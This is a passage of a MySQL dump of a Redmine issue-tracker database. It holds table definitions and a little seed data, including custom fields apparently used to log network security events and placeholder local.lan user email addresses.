-- MySQL dump 10.13  Distrib 5.7.34, for Linux (x86_64)
--
-- Host: localhost    Database: redmine
-- ------------------------------------------------------
-- Server version	5.7.34

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `ar_internal_metadata`
--

DROP TABLE IF EXISTS `ar_internal_metadata`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ar_internal_metadata` (
  `key` varchar(255) NOT NULL,
  `value` varchar(255) DEFAULT NULL,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  PRIMARY KEY (`key`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ar_internal_metadata`
--

LOCK TABLES `ar_internal_metadata` WRITE;
/*!40000 ALTER TABLE `ar_internal_metadata` DISABLE KEYS */;
INSERT INTO `ar_internal_metadata` VALUES ('environment','production','2021-01-27 14:50:36','2021-01-27 14:50:36');
/*!40000 ALTER TABLE `ar_internal_metadata` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `attachments`
--

DROP TABLE IF EXISTS `attachments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `attachments` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `container_id` int(11) DEFAULT NULL,
  `container_type` varchar(30) DEFAULT NULL,
  `filename` varchar(255) NOT NULL DEFAULT '',
  `disk_filename` varchar(255) NOT NULL DEFAULT '',
  `filesize` bigint(20) NOT NULL DEFAULT '0',
  `content_type` varchar(255) DEFAULT '',
  `digest` varchar(64) NOT NULL DEFAULT '',
  `downloads` int(11) NOT NULL DEFAULT '0',
  `author_id` int(11) NOT NULL DEFAULT '0',
  `created_on` timestamp NULL DEFAULT NULL,
  `description` varchar(255) DEFAULT NULL,
  `disk_directory` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `index_attachments_on_author_id` (`author_id`),
  KEY `index_attachments_on_created_on` (`created_on`),
  KEY `index_attachments_on_container_id_and_container_type` (`container_id`,`container_type`),
  KEY `index_attachments_on_disk_filename` (`disk_filename`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `attachments`
--

LOCK TABLES `attachments` WRITE;
/*!40000 ALTER TABLE `attachments` DISABLE KEYS */;
/*!40000 ALTER TABLE `attachments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_sources`
--

DROP TABLE IF EXISTS `auth_sources`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_sources` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `type` varchar(30) NOT NULL DEFAULT '',
  `name` varchar(60) NOT NULL DEFAULT '',
  `host` varchar(60) DEFAULT NULL,
  `port` int(11) DEFAULT NULL,
  `account` varchar(255) DEFAULT NULL,
  `account_password` varchar(255) DEFAULT '',
  `base_dn` varchar(255) DEFAULT NULL,
  `attr_login` varchar(30) DEFAULT NULL,
  `attr_firstname` varchar(30) DEFAULT NULL,
  `attr_lastname` varchar(30) DEFAULT NULL,
  `attr_mail` varchar(30) DEFAULT NULL,
  `onthefly_register` tinyint(1) NOT NULL DEFAULT '0',
  `tls` tinyint(1) NOT NULL DEFAULT '0',
  `filter` text,
  `timeout` int(11) DEFAULT NULL,
  `verify_peer` tinyint(1) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`),
  KEY `index_auth_sources_on_id_and_type` (`id`,`type`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_sources`
--

LOCK TABLES `auth_sources` WRITE;
/*!40000 ALTER TABLE `auth_sources` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_sources` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `boards`
--

DROP TABLE IF EXISTS `boards`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `boards` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `project_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL DEFAULT '',
  `description` varchar(255) DEFAULT NULL,
  `position` int(11) DEFAULT NULL,
  `topics_count` int(11) NOT NULL DEFAULT '0',
  `messages_count` int(11) NOT NULL DEFAULT '0',
  `last_message_id` int(11) DEFAULT NULL,
  `parent_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `boards_project_id` (`project_id`),
  KEY `index_boards_on_last_message_id` (`last_message_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `boards`
--

LOCK TABLES `boards` WRITE;
/*!40000 ALTER TABLE `boards` DISABLE KEYS */;
/*!40000 ALTER TABLE `boards` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `changes`
--

DROP TABLE IF EXISTS `changes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `changes` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `changeset_id` int(11) NOT NULL,
  `action` varchar(1) NOT NULL DEFAULT '',
  `path` text NOT NULL,
  `from_path` text,
  `from_revision` varchar(255) DEFAULT NULL,
  `revision` varchar(255) DEFAULT NULL,
  `branch` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `changesets_changeset_id` (`changeset_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `changes`
--

LOCK TABLES `changes` WRITE;
/*!40000 ALTER TABLE `changes` DISABLE KEYS */;
/*!40000 ALTER TABLE `changes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `changeset_parents`
--

DROP TABLE IF EXISTS `changeset_parents`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `changeset_parents` (
  `changeset_id` int(11) NOT NULL,
  `parent_id` int(11) NOT NULL,
  KEY `changeset_parents_changeset_ids` (`changeset_id`),
  KEY `changeset_parents_parent_ids` (`parent_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `changeset_parents`
--

LOCK TABLES `changeset_parents` WRITE;
/*!40000 ALTER TABLE `changeset_parents` DISABLE KEYS */;
/*!40000 ALTER TABLE `changeset_parents` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `changesets`
--

DROP TABLE IF EXISTS `changesets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `changesets` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `repository_id` int(11) NOT NULL,
  `revision` varchar(255) NOT NULL,
  `committer` varchar(255) DEFAULT NULL,
  `committed_on` datetime NOT NULL,
  `comments` longtext,
  `commit_date` date DEFAULT NULL,
  `scmid` varchar(255) DEFAULT NULL,
  `user_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `changesets_repos_rev` (`repository_id`,`revision`),
  KEY `index_changesets_on_user_id` (`user_id`),
  KEY `index_changesets_on_repository_id` (`repository_id`),
  KEY `index_changesets_on_committed_on` (`committed_on`),
  KEY `changesets_repos_scmid` (`repository_id`,`scmid`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `changesets`
--

LOCK TABLES `changesets` WRITE;
/*!40000 ALTER TABLE `changesets` DISABLE KEYS */;
/*!40000 ALTER TABLE `changesets` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `changesets_issues`
--

DROP TABLE IF EXISTS `changesets_issues`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `changesets_issues` (
  `changeset_id` int(11) NOT NULL,
  `issue_id` int(11) NOT NULL,
  UNIQUE KEY `changesets_issues_ids` (`changeset_id`,`issue_id`),
  KEY `index_changesets_issues_on_issue_id` (`issue_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `changesets_issues`
--

LOCK TABLES `changesets_issues` WRITE;
/*!40000 ALTER TABLE `changesets_issues` DISABLE KEYS */;
/*!40000 ALTER TABLE `changesets_issues` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `comments`
--

DROP TABLE IF EXISTS `comments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `comments` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `commented_type` varchar(30) NOT NULL DEFAULT '',
  `commented_id` int(11) NOT NULL DEFAULT '0',
  `author_id` int(11) NOT NULL DEFAULT '0',
  `content` text,
  `created_on` datetime NOT NULL,
  `updated_on` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `index_comments_on_commented_id_and_commented_type` (`commented_id`,`commented_type`),
  KEY `index_comments_on_author_id` (`author_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `comments`
--

LOCK TABLES `comments` WRITE;
/*!40000 ALTER TABLE `comments` DISABLE KEYS */;
/*!40000 ALTER TABLE `comments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `custom_field_enumerations`
--

DROP TABLE IF EXISTS `custom_field_enumerations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `custom_field_enumerations` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `custom_field_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `position` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `custom_field_enumerations`
--

LOCK TABLES `custom_field_enumerations` WRITE;
/*!40000 ALTER TABLE `custom_field_enumerations` DISABLE KEYS */;
/*!40000 ALTER TABLE `custom_field_enumerations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `custom_fields`
--

DROP TABLE IF EXISTS `custom_fields`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `custom_fields` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `type` varchar(30) NOT NULL DEFAULT '',
  `name` varchar(30) NOT NULL DEFAULT '',
  `field_format` varchar(30) NOT NULL DEFAULT '',
  `possible_values` text,
  `regexp` varchar(255) DEFAULT '',
  `min_length` int(11) DEFAULT NULL,
  `max_length` int(11) DEFAULT NULL,
  `is_required` tinyint(1) NOT NULL DEFAULT '0',
  `is_for_all` tinyint(1) NOT NULL DEFAULT '0',
  `is_filter` tinyint(1) NOT NULL DEFAULT '0',
  `position` int(11) DEFAULT NULL,
  `searchable` tinyint(1) DEFAULT '0',
  `default_value` text,
  `editable` tinyint(1) DEFAULT '1',
  `visible` tinyint(1) NOT NULL DEFAULT '1',
  `multiple` tinyint(1) DEFAULT '0',
  `format_store` text,
  `description` text,
  PRIMARY KEY (`id`),
  KEY `index_custom_fields_on_id_and_type` (`id`,`type`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `custom_fields`
--

LOCK TABLES `custom_fields` WRITE;
/*!40000 ALTER TABLE `custom_fields` DISABLE KEYS */;
INSERT INTO `custom_fields` VALUES (1,'IssueCustomField','Source Hostname','string',NULL,'',NULL,NULL,0,1,0,1,1,'',1,1,0,'--- !ruby/hash:ActiveSupport::HashWithIndifferentAccess\ntext_formatting: \'\'\nurl_pattern: \'\'\n',''),(2,'IssueCustomField','Source IP:Port','string',NULL,'',NULL,NULL,0,1,0,2,1,'',1,1,0,'--- !ruby/hash:ActiveSupport::HashWithIndifferentAccess\ntext_formatting: \'\'\nurl_pattern: \'\'\n',''),(3,'IssueCustomField','Destination IP:Port','string',NULL,'',NULL,NULL,0,1,0,7,1,'',1,1,0,'--- !ruby/hash:ActiveSupport::HashWithIndifferentAccess\ntext_formatting: \'\'\nurl_pattern: \'\'\n',''),(4,'IssueCustomField','Source MAC','string',NULL,'',NULL,NULL,0,1,0,3,1,'',1,1,0,'--- !ruby/hash:ActiveSupport::HashWithIndifferentAccess\ntext_formatting: \'\'\nurl_pattern: \'\'\n',''),(5,'IssueCustomField','Destination MAC','string',NULL,'',NULL,NULL,0,1,0,8,1,'',1,1,0,'--- !ruby/hash:ActiveSupport::HashWithIndifferentAccess\ntext_formatting: \'\'\nurl_pattern: \'\'\n',''),(6,'IssueCustomField','Destination Hostname','string',NULL,'',NULL,NULL,0,1,0,6,1,'',1,1,0,'--- !ruby/hash:ActiveSupport::HashWithIndifferentAccess\ntext_formatting: \'\'\nurl_pattern: \'\'\n',''),(7,'IssueCustomField','Event Type','string',NULL,'',NULL,NULL,0,1,0,9,1,'',1,1,0,'--- !ruby/hash:ActiveSupport::HashWithIndifferentAccess\ntext_formatting: \'\'\nurl_pattern: \'\'\n',''),(8,'IssueCustomField','Source Log','string',NULL,'',NULL,NULL,0,1,0,4,1,'',1,1,0,'--- !ruby/hash:ActiveSupport::HashWithIndifferentAccess\ntext_formatting: \'\'\nurl_pattern: \'\'\n',''),(9,'IssueCustomField','Protocols','string',NULL,'',NULL,NULL,0,1,0,5,1,'',1,1,0,'--- !ruby/hash:ActiveSupport::HashWithIndifferentAccess\ntext_formatting: \'\'\nurl_pattern: \'\'\n',''),(12,'IssueCustomField','RFI Number','string',NULL,'',NULL,NULL,0,1,0,10,1,'',1,1,0,'--- !ruby/hash:ActiveSupport::HashWithIndifferentAccess\ntext_formatting: \'\'\nurl_pattern: \'\'\n','');
/*!40000 ALTER TABLE `custom_fields` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `custom_fields_projects`
--

DROP TABLE IF EXISTS `custom_fields_projects`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `custom_fields_projects` (
  `custom_field_id` int(11) NOT NULL DEFAULT '0',
  `project_id` int(11) NOT NULL DEFAULT '0',
  UNIQUE KEY `index_custom_fields_projects_on_custom_field_id_and_project_id` (`custom_field_id`,`project_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `custom_fields_projects`
--

LOCK TABLES `custom_fields_projects` WRITE;
/*!40000 ALTER TABLE `custom_fields_projects` DISABLE KEYS */;
/*!40000 ALTER TABLE `custom_fields_projects` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `custom_fields_roles`
--

DROP TABLE IF EXISTS `custom_fields_roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `custom_fields_roles` (
  `custom_field_id` int(11) NOT NULL,
  `role_id` int(11) NOT NULL,
  UNIQUE KEY `custom_fields_roles_ids` (`custom_field_id`,`role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `custom_fields_roles`
--

LOCK TABLES `custom_fields_roles` WRITE;
/*!40000 ALTER TABLE `custom_fields_roles` DISABLE KEYS */;
/*!40000 ALTER TABLE `custom_fields_roles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `custom_fields_trackers`
--

DROP TABLE IF EXISTS `custom_fields_trackers`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `custom_fields_trackers` (
  `custom_field_id` int(11) NOT NULL DEFAULT '0',
  `tracker_id` int(11) NOT NULL DEFAULT '0',
  UNIQUE KEY `index_custom_fields_trackers_on_custom_field_id_and_tracker_id` (`custom_field_id`,`tracker_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `custom_fields_trackers`
--

LOCK TABLES `custom_fields_trackers` WRITE;
/*!40000 ALTER TABLE `custom_fields_trackers` DISABLE KEYS */;
INSERT INTO `custom_fields_trackers` VALUES (1,1),(2,1),(3,1),(4,1),(5,1),(6,1),(7,1),(8,1),(9,1),(12,2);
/*!40000 ALTER TABLE `custom_fields_trackers` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `custom_values`
--

DROP TABLE IF EXISTS `custom_values`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `custom_values` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `customized_type` varchar(30) NOT NULL DEFAULT '',
  `customized_id` int(11) NOT NULL DEFAULT '0',
  `custom_field_id` int(11) NOT NULL DEFAULT '0',
  `value` longtext,
  PRIMARY KEY (`id`),
  KEY `custom_values_customized` (`customized_type`,`customized_id`),
  KEY `index_custom_values_on_custom_field_id` (`custom_field_id`)
) ENGINE=InnoDB AUTO_INCREMENT=19 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `custom_values`
--

LOCK TABLES `custom_values` WRITE;
/*!40000 ALTER TABLE `custom_values` DISABLE KEYS */;
/*!40000 ALTER TABLE `custom_values` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `documents`
--

DROP TABLE IF EXISTS `documents`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `documents` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `project_id` int(11) NOT NULL DEFAULT '0',
  `category_id` int(11) NOT NULL DEFAULT '0',
  `title` varchar(255) NOT NULL DEFAULT '',
  `description` text,
  `created_on` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `documents_project_id` (`project_id`),
  KEY `index_documents_on_category_id` (`category_id`),
  KEY `index_documents_on_created_on` (`created_on`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `documents`
--

LOCK TABLES `documents` WRITE;
/*!40000 ALTER TABLE `documents` DISABLE KEYS */;
/*!40000 ALTER TABLE `documents` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `email_addresses`
--

DROP TABLE IF EXISTS `email_addresses`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `email_addresses` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `address` varchar(255) NOT NULL,
  `is_default` tinyint(1) NOT NULL DEFAULT '0',
  `notify` tinyint(1) NOT NULL DEFAULT '1',
  `created_on` datetime NOT NULL,
  `updated_on` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `index_email_addresses_on_user_id` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `email_addresses`
--

LOCK TABLES `email_addresses` WRITE;
/*!40000 ALTER TABLE `email_addresses` DISABLE KEYS */;
INSERT INTO `email_addresses` VALUES (1,1,'admin@local.lan',1,1,'2021-01-27 14:50:36','2021-01-27 14:52:33'),(2,5,'net1@local.lan',1,1,'2021-01-27 14:59:53','2021-01-27 14:59:53'),(3,6,'host1@local.lan',1,1,'2021-01-27 15:00:34','2021-01-27 15:00:34'),(4,9,'sbo_net1@local.lan',1,1,'2021-01-28 14:51:11','2021-01-28 14:51:11'),(5,10,'sbo_net2@local.lan',1,1,'2021-01-28 14:51:45','2021-01-28 14:51:45'),(6,11,'sbo_net3@local.lan',1,1,'2021-01-28 14:52:14','2021-01-28 14:52:14'),(7,12,'sbo_host1@local.lan',1,1,'2021-01-28 14:52:54','2021-01-28 14:52:54'),(8,13,'sbo_host2@local.lan',1,1,'2021-01-28 14:53:31','2021-01-28 14:53:31'),(9,14,'sbo_host3@local.lan',1,1,'2021-01-28 14:54:00','2021-01-28 14:54:00');
/*!40000 ALTER TABLE `email_addresses` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `enabled_modules`
--

DROP TABLE IF EXISTS `enabled_modules`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `enabled_modules` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `project_id` int(11) DEFAULT NULL,
  `name` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `enabled_modules_project_id` (`project_id`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `enabled_modules`
--

LOCK TABLES `enabled_modules` WRITE;
/*!40000 ALTER TABLE `enabled_modules` DISABLE KEYS */;
INSERT INTO `enabled_modules` VALUES (1,1,'issue_tracking'),(9,1,'calendar');
/*!40000 ALTER TABLE `enabled_modules` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `enumerations`
--

DROP TABLE IF EXISTS `enumerations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `enumerations` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(30) NOT NULL DEFAULT '',
  `position` int(11) DEFAULT NULL,
  `is_default` tinyint(1) NOT NULL DEFAULT '0',
  `type` varchar(255) DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `project_id` int(11) DEFAULT NULL,
  `parent_id` int(11) DEFAULT NULL,
  `position_name` varchar(30) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `index_enumerations_on_project_id` (`project_id`),
  KEY `index_enumerations_on_id_and_type` (`id`,`type`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `enumerations`
--

LOCK TABLES `enumerations` WRITE;
/*!40000 ALTER TABLE `enumerations` DISABLE KEYS */;
INSERT INTO `enumerations` VALUES (1,'High',4,0,'IssuePriority',1,NULL,NULL,'highest'),(2,'Medium',3,1,'IssuePriority',1,NULL,NULL,'default'),(3,'Low',2,0,'IssuePriority',1,NULL,NULL,'low2'),(5,'Parent',1,0,'IssuePriority',1,NULL,NULL,'lowest');
/*!40000 ALTER TABLE `enumerations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `groups_users`
--

DROP TABLE IF EXISTS `groups_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `groups_users` (
  `group_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  UNIQUE KEY `groups_users_ids` (`group_id`,`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `groups_users`
--

LOCK TABLES `groups_users` WRITE;
/*!40000 ALTER TABLE `groups_users` DISABLE KEYS */;
INSERT INTO `groups_users` VALUES (7,1),(7,5),(7,6),(7,9),(7,12),(8,10),(8,11),(8,13),(8,14);
/*!40000 ALTER TABLE `groups_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `import_items`
--

DROP TABLE IF EXISTS `import_items`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `import_items` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `import_id` int(11) NOT NULL,
  `position` int(11) NOT NULL,
  `obj_id` int(11) DEFAULT NULL,
  `message` text,
  `unique_id` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `index_import_items_on_import_id_and_unique_id` (`import_id`,`unique_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `import_items`
--

LOCK TABLES `import_items` WRITE;
/*!40000 ALTER TABLE `import_items` DISABLE KEYS */;
/*!40000 ALTER TABLE `import_items` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `imports`
--

DROP TABLE IF EXISTS `imports`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `imports` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `type` varchar(255) DEFAULT NULL,
  `user_id` int(11) NOT NULL,
  `filename` varchar(255) DEFAULT NULL,
  `settings` text,
  `total_items` int(11) DEFAULT NULL,
  `finished` tinyint(1) NOT NULL DEFAULT '0',
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `imports`
--

LOCK TABLES `imports` WRITE;
/*!40000 ALTER TABLE `imports` DISABLE KEYS */;
/*!40000 ALTER TABLE `imports` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `issue_categories`
--

DROP TABLE IF EXISTS `issue_categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `issue_categories` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `project_id` int(11) NOT NULL DEFAULT '0',
  `name` varchar(60) NOT NULL DEFAULT '',
  `assigned_to_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `issue_categories_project_id` (`project_id`),
  KEY `index_issue_categories_on_assigned_to_id` (`assigned_to_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `issue_categories`
--

LOCK TABLES `issue_categories` WRITE;
/*!40000 ALTER TABLE `issue_categories` DISABLE KEYS */;
/*!40000 ALTER TABLE `issue_categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `issue_relations`
--

DROP TABLE IF EXISTS `issue_relations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `issue_relations` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `issue_from_id` int(11) NOT NULL,
  `issue_to_id` int(11) NOT NULL,
  `relation_type` varchar(255) NOT NULL DEFAULT '',
  `delay` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `index_issue_relations_on_issue_from_id_and_issue_to_id` (`issue_from_id`,`issue_to_id`),
  KEY `index_issue_relations_on_issue_from_id` (`issue_from_id`),
  KEY `index_issue_relations_on_issue_to_id` (`issue_to_id`)
) ENGINE=InnoDB AUTO_INCREMENT=31 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `issue_relations`
--

LOCK TABLES `issue_relations` WRITE;
/*!40000 ALTER TABLE `issue_relations` DISABLE KEYS */;
INSERT INTO `issue_relations` VALUES (11,46,113,'copied_to',NULL),(12,135,136,'copied_to',NULL),(13,136,138,'copied_to',NULL),(14,138,139,'copied_to',NULL),(16,139,146,'copied_to',NULL),(17,146,147,'copied_to',NULL),(18,141,149,'copied_to',NULL),(19,154,157,'copied_to',NULL),(20,157,159,'copied_to',NULL),(21,159,160,'copied_to',NULL),(22,160,163,'copied_to',NULL),(23,163,164,'copied_to',NULL),(26,166,167,'copied_to',NULL),(27,167,168,'copied_to',NULL),(28,168,169,'copied_to',NULL),(29,169,170,'copied_to',NULL),(30,170,171,'copied_to',NULL);
/*!40000 ALTER TABLE `issue_relations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `issue_statuses`
--

DROP TABLE IF EXISTS `issue_statuses`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `issue_statuses` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(30) NOT NULL DEFAULT '',
  `is_closed` tinyint(1) NOT NULL DEFAULT '0',
  `position` int(11) DEFAULT NULL,
  `default_done_ratio` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
